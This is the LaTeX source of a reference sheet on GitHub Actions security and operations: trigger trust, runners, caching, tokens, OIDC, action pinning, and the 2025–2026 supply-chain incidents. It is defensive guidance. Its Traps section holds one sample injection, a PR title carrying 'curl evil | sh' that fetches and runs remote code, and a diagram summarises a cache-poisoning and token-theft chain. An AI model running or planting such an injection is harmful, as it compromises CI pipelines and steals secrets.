@@ -1,0 +1,310 @@
+% github-actions-deep.tex — GitHub Actions: the event → workflow → job → runner model, which trigger
+% runs whose code with which token and secrets (pull_request vs pull_request_target, workflow_run,
+% issue_comment, merge_group), pwn requests and cache poisoning, hosted runners (labels, specs,
+% prices), concurrency, matrix, cache, artifacts, reusable workflows vs composite actions,
+% GITHUB_TOKEN, OIDC, secrets and environments, pinning, limits, the 2025–2026 changes.
+% Sources (checked 2026-10-09):
+%   docs.github.com/en/actions/reference/runners/github-hosted-runners (labels; public 4 vCPU 16 GB /
+%     private 2 vCPU 8 GB; macOS arm64 M1 3 vCPU 7 GB; Intel 4 vCPU 14 GB; ubuntu-slim 1 vCPU, 15 min)
+%   github.com/actions/runner-images README (macos-latest = macos-26; xcode-27 preview; ≤ 2 GA + 1 beta
+%     image; one Xcode major per macOS image) · images/macos/macos-26-arm64-Readme.md (Xcode 26.6
+%     default) · xcode-27-arm64-Readme.md (macOS 27.0, Xcode 27.0 default) · issues 14167, 14404
+%   github.blog/changelog: 2026-05-14 image migrations (macos-latest → 26 from 15 Jun, 30 days) ·
+%     2026-02-26 macos-26 GA · 2026-07-16 xcode-27 preview (images named by Xcode major) · 2026-09-10
+%     xcode-27 on macOS 27 · 2026-10-01 macOS 14 retired 2 Nov 2026, brownouts · 2026-01-22 1 vCPU
+%     runner GA (container, 15 min) · 2025-12-16 pricing update (hosted −≤39 % from 1 Jan 2026;
+%     self-hosted $0.002/min charge postponed)
+%   docs.github.com/en/billing/reference/actions-runner-pricing ($0.002 / 0.006 / 0.005 arm /
+%     0.010 Windows / 0.062 macOS / 0.102 M2 Pro; rounded up per job) · billing/concepts/product-
+%     billing/github-actions (2,000 / 3,000 / 3,000 / 50,000 min; self-hosted + public free; cache
+%     over 10 GB $0.07/GB-month)
+%   docs.github.com/en/actions/reference/limits (6 h / 5 d job, 35 d run, 256 matrix, 50 re-runs,
+%     500 KB file, 1,500 events/10 s, 100 per concurrency queue, concurrency 20/40/60/500 and macOS
+%     5/5/5/50, GITHUB_TOKEN 1,000 req/h/repo)
+%   docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax (concurrency + queue;
+%     permissions: naming one sets the rest to none; timeout-minutes 360; fail-fast true; 256;
+%     shell defaults bash -e vs -eo pipefail; outputs 1 MB/job, 50 MB/run; dispatch inputs 25)
+%   …/events-that-trigger-workflows (fork PR: no secrets, read-only token, refs/pull/N/merge, no run
+%     on conflict; pull_request_target on default branch; workflow_run ≤ 3 levels; schedule 5 min,
+%     disabled after 60 days idle in public repos)
+%   …/dependency-caching (10 GB, 7 days, key ≤ 512, immutable, scopes, merge-ref caches re-runs only,
+%     low-trust = pull_request_target, issue_comment, workflow_run; cache-mode values)
+%   …/reusing-workflow-configurations + concepts page (10 levels, 50 unique per file, env not
+%     propagated, permissions only kept or reduced; composite ≤ 10 per workflow, one log step,
+%     no secrets) · …/workflow-commands (step summary 1 MiB) · …/deployments-and-environments
+%     (≤ 6 reviewers, wait ≤ 43,200 min, self-review block)
+%   docs.github.com/en/actions/concepts/security/github_token (installation token; job end; no new
+%     runs except workflow_dispatch / repository_dispatch; PR opened/synchronize/reopened →
+%     approval-required) · …/reference/security/oidc (sub formats; repo:OWNER@ID/REPO@ID for repos
+%     created after 15 Jul 2026) · github.blog/changelog/2026-04-23 immutable subject claims
+%   docs.github.com/en/actions/reference/security/secure-use (SHA pin = only immutable reference;
+%     env-var against script injection; JSON blobs defeat redaction; derived values → add-mask;
+%     self-hosted never on public repos; JIT runners; Dependabot does not alert SHA-pinned actions)
+%     · …/reference/security/secrets (100 repo / 100 env / 1,000 org, 48 KB) · …/runners/self-hosted-
+%     runners (no jobs if not updated within 30 days) · repositories/…/managing-github-actions-
+%     settings (cache 90 / 365 days and up to 10,000 GB; artifacts 90 days, 1–90 / 1–400; SHA-pin
+%     policy; new personal repos: token reads contents + packages)
+%   github.blog/changelog: 2025-11-07 pull_request_target uses the default branch from 8 Dec 2025 ·
+%     2026-06-18 checkout v7 refuses fork PR code in pull_request_target / workflow_run,
+%     allow-unsafe-pr-checkout · github.com/actions/checkout releases (v7.0.0 18 Jun; v6.1.0, v5.1.0,
+%     v4.4.0 backports 20 Jul 2026) · 2026-06-26 read-only cache for untrusted triggers · 2026-09-10
+%     cache-mode · 2026-05-07 concurrency queue · 2025-08-15 SHA-pin policy + ! blocklist ·
+%     2025-09-18 YAML anchors · 2025-10-28 immutable releases GA · 2025-09-19 Node 20 deprecation
+%     (Node 24 default 16 Jun 2026, Node 20 removed 23 Sep 2026) · 2026-06-18 workflow execution
+%     protections (public preview)
+%   github.com/actions/{cache (v6), upload-artifact (v7, archive: false), download-artifact (v8,
+%     hash mismatch = error)} READMEs / releases · github.com/github/gh-actions-lock README
+%     (.github/workflows/actions.lock, technical preview, pre-1.0)
+%   github.com/advisories/GHSA-mrrh-fwg8-r2c3 (tj-actions/changed-files ≤ 45.0.7, 14–15 Mar 2025,
+%     23,000+ repos, Runner.Worker memory to logs, fixed 46.0.1) · cisa.gov alert 2025-03-18
+%     (CVE-2025-30066, CVE-2025-30154 reviewdog/action-setup@v1, 11 Mar 2025) ·
+%     unit42.paloaltonetworks.com/github-actions-supply-chain-attack (chain began with a
+%     pull_request_target PR on spotbugs/sonar-findbugs, Dec 2024 — a vendor report built on
+%     maintainer statements, one link called an estimate: marked \unverified on the page) ·
+%     tanstack.com/blog/npm-supply-chain-compromise-postmortem (11 May 2026, 84 versions / 42
+%     packages, pwn request + cache poisoning + OIDC token from runner memory)
+% Not repeated: pipeline design and merge queues (ci-pipeline-design); npm supply chain
+% (supply-chain-security); RN Android job (rn-ci-and-signing).
+% @labels: area=cicd kind=tooling platform=general topic=build,security,tooling discussion=299
+% @tags: github-actions, ci-cd, pull-request-target, cache-poisoning, github-token, oidc, reusable-workflows, composite-actions, concurrency, build-matrix, action-pinning, self-hosted-runners, macos-runners, supply-chain, artifacts
+\documentclass[8pt]{extarticle}
+\usepackage{printup-sheet}
+\usepackage{array}
+
+\lstdefinelanguage{YamlSheet}{
+  morekeywords={on,jobs,runs-on,needs,strategy,matrix,steps,uses,with,run,env,permissions,
+    concurrency,group,environment,if,name,cache-mode,timeout-minutes},
+  sensitive=true, morecomment=[l]{\#}, morestring=[b]", morestring=[b]',
+  literate={--}{{\hbox{-}\hbox{-}}}2 {->}{{\hbox{-}\hbox{>}}}2 {=>}{{\hbox{=}\hbox{>}}}2
+           {==}{{\hbox{=}\hbox{=}}}2 {!=}{{\hbox{!}\hbox{=}}}2 {||}{{\hbox{|}\hbox{|}}}2
+           {&&}{{\hbox{\&}\hbox{\&}}}2 {//}{{\hbox{/}\hbox{/}}}2}
+\lstset{basicstyle=\ttfamily\scriptsize, aboveskip=2pt, belowskip=2pt}
+\newcommand\ct[1]{\texttt{#1}}
+\newcommand\dd{\hbox{-}\hbox{-}}
+\newcommand\hd[1]{\par\vspace{2pt}\noindent{\bfseries\color{sheetBlue}#1}\par\vspace{1pt}}
+
+\tikzset{
+  ev/.style={box, font=\tiny\ttfamily, inner sep=1.2pt, text width=23.5mm, minimum height=3.6mm, align=left},
+  jb/.style={box, font=\tiny, inner sep=1.5pt, text width=15mm, minimum height=7mm},
+  rn/.style={box, font=\tiny, inner sep=1.3pt, text width=48mm, align=left, draw=sheetGrey, fill=black!4},
+  lbl/.style={font=\tiny, text=black!75, inner sep=1pt, align=center},
+  ttl/.style={font=\bfseries\scriptsize, text=sheetBlue, anchor=west},
+  tl/.style={font=\tiny, anchor=north west, inner sep=0.5pt, align=left},
+  ch/.style={box, font=\tiny, inner sep=1.3pt, text width=22mm, align=left, minimum height=8mm},
+  fx/.style={font=\tiny, text=sheetGreen!50!black, inner sep=0.5pt, align=center},
+}
+
+\begin{document}
+
+\sheettitle{GitHub Actions — triggers, trust, runners, tokens}{cicd · folio}
+
+\oneliner{An \textbf{event} starts every workflow in \ct{.github/workflows/} whose \ct{on:} matches; its
+\textbf{jobs} form a DAG (\ct{needs:}), each on a \textbf{fresh runner}, running \textbf{steps} in one
+workspace. Security is \textbf{which code runs with which token, secrets and cache}: the trigger decides,
+\ct{permissions:} and \ct{cache-mode:} narrow it, \textbf{OIDC} replaces stored cloud keys, a \textbf{commit
+SHA} pins what runs.}
+
+\vspace{2pt}
+\noindent\begin{tikzpicture}[sheet]
+  % events
+  \node[ttl] at (-0.15,3.75) {1 event};
+  \node[ev] (e1) at (1.1,3.35) {push · schedule · dispatch};
+  \node[ev] (e2) at (1.1,2.92) {pull\_request (fork)};
+  \node[ev] (e6) at (1.1,2.49) {merge\_group};
+  \node[ev, draw=sheetRed, fill=sheetRed!8] (e3) at (1.1,2.06) {pull\_request\_target};
+  \node[ev, draw=sheetRed, fill=sheetRed!8] (e5) at (1.1,1.63) {workflow\_run};
+  \node[ev, draw=sheetRed, fill=sheetRed!8] (e4) at (1.1,1.20) {issue\_comment};
+  \node[lbl, text=sheetRed, anchor=north west, align=left] at (-0.15,0.95) {red = \textbf{default-branch} workflow, secrets + write\\token — yet an \textbf{outsider} can fire it};
+  % workflow
+  \node[ttl] at (2.45,3.75) {2 workflow};
+  \node[box, font=\tiny, text width=19mm, align=left, minimum height=26mm] (wf) at (3.55,2.27)
+    {\ct{ci.yml}\\[1pt]\ct{on:} filters\\(branches, paths,\\types)\\[1pt]\ct{permissions:}\\\ct{concurrency:}\\\ct{cache-mode:}\\\ct{env:} · \ct{defaults:}};
+  \foreach \e in {e1,e2,e6,e3,e5,e4} \draw[flow] (\e.east) -- (wf.west |- \e);
+  % jobs DAG
+  \node[ttl] at (4.8,3.75) {3 jobs = DAG via \ct{needs:}};
+  \node[jb] (lint) at (5.65,3.1) {\textbf{lint}\\\ct{ubuntu-slim}};
+  \node[jb] (t1) at (5.65,2.25) {\textbf{test} ×3\\matrix};
+  \node[jb, draw=sheetGreen!70!black, fill=sheetGreen!8, text width=17mm] (bld) at (7.65,2.65) {\textbf{build}\\\ct{needs: [lint,}\\\ct{test]}};
+  \node[jb, draw=sheetOrange, fill=sheetOrange!10] (dep) at (9.7,2.65) {\textbf{deploy}\\\ct{environment:}\\\ct{prod}};
+  \draw[flow] (wf.east |- lint) -- (lint); \draw[flow] (wf.east |- t1) -- (t1);
+  \draw[flow] (lint) -- (bld); \draw[flow] (t1) -- (bld); \draw[hot] (bld) -- (dep);
+  \node[lbl, anchor=north west, align=left] at (4.85,1.72) {jobs run \textbf{in parallel} unless \ct{needs:};\\no shared disk: pass data as \textbf{artifacts}\\or job \ct{outputs:}; a failed or skipped need\\skips its dependants unless \ct{if: always()}};
+  \node[lbl, anchor=north west, align=left, text=sheetOrange!85!black] at (8.85,2.05) {gate: reviewers,\\wait timer, branch\\filter; env secrets\\only after approval};
+  % runners
+  \node[ttl] at (11.25,3.75) {4 runner, fresh per job};
+  \node[rn] (r1) at (13.85,3.33) {\ct{ubuntu-latest}=\ct{24.04} · \ct{-arm} · \ct{26.04}: private 2 vCPU\\8 GB, public 4 vCPU 16 GB · \$0.006/min, arm \$0.005};
+  \node[rn] (r0) at (13.85,2.86) {\ct{ubuntu-slim}: 1 vCPU, a \textbf{container}, 15-min cap · \$0.002};
+  \node[rn] (r2) at (13.85,2.39) {\ct{macos-latest}=\ct{macos-26} (Xcode 26.6), \ct{macos-15}: M1,\\3 vCPU, 7 GB · \$0.062/min · Intel: \ct{macos-15/26-intel}};
+  \node[rn, draw=sheetBlue, fill=sheetBlue!5] (r4) at (13.85,1.84) {\ct{xcode-27} (preview): macOS 27 + Xcode 27.0 — images\\are now named by \textbf{Xcode major}, one major each};
+  \node[rn, draw=sheetRed, fill=sheetRed!6] (r3) at (13.85,1.36) {\ct{self-hosted}: your box, persistent, \textbf{your risk}; minutes free};
+  \foreach \r in {r1,r0,r2,r4,r3} \draw[flow] (dep.east) -- (\r.west);
+  \node[lbl, anchor=north west, align=left] at (11.3,1.17) {6 h/job · minutes rounded up per job · free on public repos};
+\end{tikzpicture}
+
+\vspace{1pt}
+\noindent\begin{tikzpicture}[sheet]
+  \draw[thick, sheetGrey] (-0.1,0) -- (16.45,0);
+  \draw[very thick, sheetGrey] (6.03,0.2) -- (6.03,-0.1);
+  \foreach \x/\m in {0/Mar 2025,1.36/Aug,2.52/Sep,3.38/Oct,4.59/Dec,6.18/Jan 2026,7.64/Feb,8.67/May,10.03/Jun,11.99/Jul,14.1/Sep,15.46/Nov}
+    {\fill[sheetBlue] (\x+0.06,0) circle (1.2pt); \node[font=\tiny\bfseries, text=sheetBlue, anchor=south west, inner sep=1pt] at (\x,0.04) {\m};}
+  \node[tl, text width=13mm, text=sheetRed] at (0,-0.08) {\textbf{14–15} tj-actions: tags re-pointed};
+  \node[tl, text width=11mm] at (1.36,-0.08) {\textbf{15} policy can require SHA pins};
+  \node[tl, text width=8mm] at (2.52,-0.08) {\textbf{18} YAML anchors};
+  \node[tl, text width=11.5mm] at (3.38,-0.08) {\textbf{28} immutable releases GA};
+  \node[tl, text width=14.5mm] at (4.59,-0.08) {\textbf{8} pull\_request\_target runs the default branch};
+  \node[tl, text width=14mm] at (6.18,-0.08) {\textbf{1} hosted −≤39\,\%; \textbf{22} \ct{ubuntu-slim} GA};
+  \node[tl, text width=9.8mm] at (7.64,-0.08) {\textbf{26} \ct{macos-26} GA};
+  \node[tl, text width=13mm] at (8.67,-0.08) {\textbf{7} \ct{queue: max};\\\textcolor{sheetRed}{\textbf{11} TanStack}};
+  \node[tl, text width=19mm] at (10.03,-0.08) {\textbf{16} Node 24 default; \textbf{18} checkout v7; \textbf{26} read-only cache, untrusted events};
+  \node[tl, text width=20.5mm] at (11.99,-0.08) {\textbf{15} OIDC \ct{sub} IDs; \ct{macos-latest}=26 by Jul; \textbf{16} \ct{xcode-27}; \textbf{20} v7 backport};
+  \node[tl, text width=13mm] at (14.1,-0.08) {\textbf{10} \ct{cache-mode}; \textbf{23} Node 20 removed};
+  \node[tl, text width=9.5mm] at (15.46,-0.08) {\textbf{2} \ct{macos-14} retires};
+\end{tikzpicture}
+
+\begin{multicols}{2}
+\raggedright\footnotesize\setstretch{1.0}
+
+\hd{Triggers and their trust}
+{\scriptsize\setlength{\tabcolsep}{2pt}
+\begin{tabular}{@{}>{\raggedright\arraybackslash}p{19mm}>{\raggedright\arraybackslash}p{24mm}>{\raggedright\arraybackslash}p{33mm}@{}}
+\toprule
+\textbf{event} & \textbf{workflow + code} & \textbf{secrets · token · cache}\\ \midrule
+\ct{push}, \ct{schedule}, \ct{workflow\_dispatch} & the pushed ref; \ct{schedule} = default branch, $\geq$5 min & all · as \ct{permissions:} · read + write\\
+\ct{pull\_request} (fork) & merge commit \ct{refs/pull/N/merge}; no run on conflict & \textbf{none} · read-only · own scope; may need approval\\
+\ct{pull\_request\_target} & \textbf{default branch} HEAD, whatever the base & \textbf{all · write} · \textbf{read-only} default\\
+\ct{workflow\_run} & default branch; $\leq$3 levels chained & all · write · read-only default\\
+\ct{issue\_comment} & default branch; anyone can comment & all · write · read-only default\\
+\ct{merge\_group} & the queue's temp branch & as push; \textbf{required} by merge queues\\
+\bottomrule
+\end{tabular}}
+
+\hd{Pwn request + cache poisoning — TanStack, 11 May 2026}
+\begin{tikzpicture}[sheet]
+  \node[ch, draw=sheetRed, fill=sheetRed!6] (a) at (0,0) {fork PR fires a \ct{pull\_request\_target} job that \textbf{builds the PR} (\ct{pnpm install})};
+  \node[ch, draw=sheetRed, fill=sheetRed!6] (b) at (2.75,0) {it \textbf{saves a poisoned pnpm cache} under the key \ct{main}'s release uses};
+  \node[ch, draw=sheetRed, fill=sheetRed!6] (c) at (5.5,0) {next push: release job \textbf{restores} it and runs attacker code};
+  \node[ch, draw=sheetRed, fill=sheetRed!12, text width=46mm] (d) at (2.75,-1.05) {\ct{id-token: write} ⇒ OIDC token \textbf{read from \ct{Runner.Worker} memory} ⇒ 84 versions of 42 \ct{@tanstack/*} on npm, 19:20–19:26 UTC};
+  \draw[hot] (a) -- (b); \draw[hot] (b) -- (c); \draw[hot] (c.south) |- (d.east);
+  \node[fx, anchor=south] at (a.north) {now: checkout v7 refuses};
+  \node[fx, anchor=south] at (b.north) {now: read-only cache};
+  \node[fx, anchor=south] at (c.north) {now: \ct{cache-mode: none}};
+  \node[fx, anchor=north west, align=left, text=sheetRed] at (5.3,-1.2) {every step of\\that job can\\take the token};
+\end{tikzpicture}\par
+\ct{actions/checkout} \textbf{v7} refuses fork-PR code in \ct{pull\_request\_target} and \ct{workflow\_run}
+unless \ct{allow-unsafe-pr-checkout: true}; backported as v6.1.0 / v5.1.0 / v4.4.0 (and v2, v3) — a
+\textbf{floating} tag got it, an old \textbf{SHA pin did not}; a plain \ct{git fetch} is never checked.
+\textbf{Safe split}: build untrusted code under \ct{pull\_request} (no secrets), do the privileged
+comment or upload in \ct{workflow\_run}, reading its artifacts as \emph{data}.
+
+\hd{Cache and artifacts}
+\begin{itemize}
+  \item \textbf{Cache}: key $\leq$512 chars, entries \textbf{immutable}; exact key, then \ct{restore-keys}
+        prefixes (newest match). Readable from the current, default and (PR) base branch; a PR's
+        merge-ref cache only by its re-runs. 10 GB/repo by default (admins raise it; over 10 GB
+        \$0.07/GB-month); evicted after \textbf{7 days unused} (max 90 public, 365 private).
+  \item \ct{cache-mode:} per workflow or job — \ct{read}, \ct{write}, \ct{write-only}, \ct{none};
+        a called workflow cannot widen it; \ct{write} on a low-trust event = warning annotation.
+  \item \textbf{Artifacts}: kept 90 days (1–90 public, 1–400 private), immutable; \ct{upload-artifact@v7}
+        \ct{archive: false} = one unzipped file; \ct{download-artifact@v8} fails on a hash mismatch.
+        Current majors: checkout v7, cache v6.
+\end{itemize}
+
+\hd{Concurrency, matrix, data between jobs}
+\begin{itemize}
+  \item \textbf{Concurrency}: per \ct{group} one running + one \emph{pending}; a newer run replaces the
+        pending one; \ct{cancel-in-progress: true} kills the running one too (PRs yes, deploys no).
+        \ct{queue: max} keeps $\leq$100 pending in order — not with \ct{cancel-in-progress}.
+  \item \textbf{Matrix}: cross product, \ct{include} adds keys or combos, \ct{exclude} drops;
+        $\leq$\textbf{256 jobs}/run; \ct{fail-fast} (default true) cancels siblings; \ct{max-parallel}.
+  \item Job \ct{outputs:} $\leq$1 MB/job, 50 MB/run; step summary $\leq$1 MiB; \ct{if:} defaults to
+        \ct{success()}; \ct{timeout-minutes} defaults to 360.
+\end{itemize}
+
+\hd{Reusable workflow vs composite action}
+{\scriptsize\setlength{\tabcolsep}{2pt}
+\begin{tabular}{@{}>{\raggedright\arraybackslash}p{12mm}>{\raggedright\arraybackslash}p{32mm}>{\raggedright\arraybackslash}p{32mm}@{}}
+\toprule
+ & \textbf{reusable} (\ct{on: workflow\_call}) & \textbf{composite} (\ct{action.yml}) \\ \midrule
+called as & a \textbf{job}: \ct{uses: o/r/.github/…@sha} & a \textbf{step} \\
+contains & jobs, own runners & steps, on the caller's runner \\
+secrets & \ct{secrets:} or \ct{inherit} (same org) & none — only via inputs \\
+logs & every step visible & one collapsed step \\
+limits & 10 levels; 50 unique per file & $\leq$10 nested per workflow \\
+caller's & \ct{env} not passed; token scopes kept or cut & shares the job's env \\
+\bottomrule
+\end{tabular}}
+
+\columnbreak
+
+\hd{A hardened deploy job}
+\begin{lstlisting}[language=YamlSheet]
+on: { push: { branches: [main] } }
+permissions: { contents: read }        # default, every job
+concurrency: { group: deploy-prod, cancel-in-progress: false }
+jobs:
+  deploy:
+    runs-on: ubuntu-24.04
+    environment: prod                  # reviewers + env secrets
+    permissions: { contents: read, id-token: write }  # OIDC
+    cache-mode: none                   # restore nothing
+    steps:
+      - uses: actions/checkout@<40-hex-sha>  # v7.0.1
+      - uses: aws-actions/configure-aws-credentials@<sha>
+        with: { role-to-assume: arn:aws:iam::123456789012:role/ci,
+                aws-region: eu-west-1 } # no stored AWS key
+      - env: { MSG: "${{ github.event.head_commit.message }}" }
+        run: ./deploy.sh "$MSG"        # env var, NOT ${{ }} in script
+\end{lstlisting}
+
+\hd{GITHUB\_TOKEN}
+Per-job GitHub App installation token, dead when the job ends; new personal repos: read
+\ct{contents} + \ct{packages}. Naming \emph{any} scope in \ct{permissions:} sets the rest to \ct{none}.
+Its events start \textbf{no runs} — except \ct{workflow\_dispatch}, \ct{repository\_dispatch}, and PRs
+it opens or pushes to, which wait for approval. 1,000 API req/h/repo.
+
+\hd{OIDC — no long-lived cloud keys}
+\ct{id-token: write} lets a step fetch a GitHub-signed JWT; the cloud checks \ct{aud} + \ct{sub} and
+returns short-lived creds. \ct{sub} = \ct{repo:O/R:environment:prod},
+\ct{…:ref:refs/heads/main} or \ct{…:pull\_request}; repos created, renamed or moved after 15 Jul 2026 get
+\ct{repo:O@123/R@456:…}, so a re-registered name no longer matches. Trusting \ct{repo:acme/*} lets every
+acme repo assume the role.
+
+\hd{Secrets and environments}
+100 per repo and per environment, 1,000 per org, 48 KB each; none for fork PRs. Masked only
+\textbf{verbatim}: a JSON blob, base64 or derived value prints in clear — \ct{::add-mask::} it.
+Environment: $\leq$6 reviewers, no self-review, wait $\leq$30 days, branch/tag filter; secrets after approval.
+
+\hd{Pinning — a tag is a movable pointer}
+A \ct{pull\_request\_target} PR on spotbugs leaked a PAT in Dec 2024\unverified; then
+\ct{reviewdog/action-setup@v1} was re-pointed (11 Mar 2025), then \ct{tj-actions/changed-files} (23k+
+repos, CVE-2025-30066): its version tags moved to code dumping \ct{Runner.Worker} memory into the log,
+public on public repos; SHA pins were untouched.
+Pin 40-hex SHAs (+ \ct{\# v4.2.2} for Dependabot / Renovate); org policy can \textbf{require} pins and
+\ct{!}block an action even when pinned; immutable releases lock tag + assets; \ct{actions.lock}
+(\ct{gh actions-lock}, technical preview) pins transitive actions. SHA pins get \textbf{no} Dependabot alerts.
+
+\hd{Limits and plans}
+Free / Pro / Team / Enterprise: concurrent jobs 20 / 40 / 60 / 500, of them macOS 5 / 5 / 5 / 50;
+included minutes 2,000 / 3,000 / 3,000 / 50,000. Run $\leq$35 days · 50 re-runs · file $\leq$500 KB ·
+25 dispatch inputs · 1,500 events/10 s/repo.
+
+\hd{Self-hosted runners}
+Persistent disk, network, credentials: a job can backdoor the next — \textbf{never on public repos};
+use JIT/ephemeral runners (one job). Job $\leq$5 days, queue 24 h; auto-update off and 30 days behind a
+release = no jobs. The \$0.002/min fee due 1 Mar 2026 was postponed.
+
+\hd{Traps}
+\begin{itemize}
+  \trap{\ct{run: echo "\$\{\{ github.event.pull\_request.title \}\}"} is pasted into the script
+        \emph{before} bash runs: a title \ct{"; curl evil | sh \#} executes. Pass it via \ct{env:}.}
+  \trap{No \ct{shell:} = \ct{bash -e \{0\}}, \textbf{no pipefail}; \ct{shell: bash} adds it.}
+  \trap{Public-repo \ct{schedule}s stop after 60 days without activity.}
+\end{itemize}
+
+\end{multicols}
+
+\noindent{\footnotesize\color{sheetGrey}\textit{Related:} \texttt{ci-pipeline-design} · \texttt{xcodebuild-simctl-cli} ·
+\texttt{fastlane-deep} · Supply-chain security · Code signing \& iOS CI/CD · React Native CI/CD \& Android
+signing · OAuth~2.0 · OIDC · JWT · Git in depth}
+
+\end{document}
